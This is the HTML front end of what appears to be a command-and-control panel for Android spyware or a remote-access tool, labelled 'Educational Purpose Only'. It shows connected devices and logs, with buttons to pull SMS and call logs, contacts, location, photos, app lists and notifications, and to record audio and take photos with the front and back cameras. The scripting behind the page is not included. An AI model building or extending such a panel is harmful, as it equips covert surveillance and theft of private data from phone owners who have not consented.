<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Android Device Demo Server</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>Android Device Demo Server</h1>
            <p class="subtitle">Educational Purpose Only</p>
        </header>
        
        <div class="main-content">
            <div class="sidebar">
                <h2>Server Status</h2>
                <div id="status-indicator" class="status-offline">● Offline</div>
                <div id="status-text">Server starting...</div>
                
                <h2>Connected Devices</h2>
                <div id="devices-container">
                    <div class="device-list-empty">No devices connected</div>
                </div>
            </div>
            
            <div class="main-panel">
                <h2>Device Logs</h2>
                <div id="logs-container" class="logs-container">
                    <div class="log-entry">Waiting for logs...</div>
                </div>
            </div>
        </div>
        
        <div class="controls">
            <h2>Send Command</h2>
            <div class="command-form">
                <div class="form-group">
                    <label for="command-input">Command:</label>
                    <input type="text" id="command-input" placeholder="e.g., get_device_info, get_sms_logs">
                </div>
                <div class="form-group">
                    <label for="args-input">Arguments (JSON):</label>
                    <input type="text" id="args-input" placeholder='e.g., {"path": "/sdcard"} or {} for no args'>
                </div>
                <div class="button-group">
                    <button id="send-btn" class="btn-primary">Send Command</button>
                    <button id="clear-logs-btn" class="btn-secondary">Clear Logs</button>
                </div>
            </div>
            
            <div class="quick-commands">
                <h3>Quick Commands</h3>
                <div class="quick-btn-group">
                    <button class="btn-small" data-cmd="get_device_info">Device Info</button>
                    <button class="btn-small" data-cmd="get_location">Location</button>
                    <button class="btn-small" data-cmd="get_gallery_list">Gallery List</button>
                    <button class="btn-small" data-cmd="get_sms_logs">SMS Logs</button>
                    <button class="btn-small" data-cmd="get_call_logs">Call Logs</button>
                    <button class="btn-small" data-cmd="get_contacts">Contacts</button>
                    <button class="btn-small" data-cmd="get_app_list">App List</button>
                    <button class="btn-small" data-cmd="get_notifications">Notifications</button>
                    <button class="btn-small" data-cmd="record_audio">Record Audio</button>
                    <button class="btn-small" data-cmd="capture_front">Front Camera</button>
                    <button class="btn-small" data-cmd="capture_back">Back Camera</button>
                </div>
            </div>
        </div>
    </div>
    
    <script src="script.js"></script>
</body>
</html>
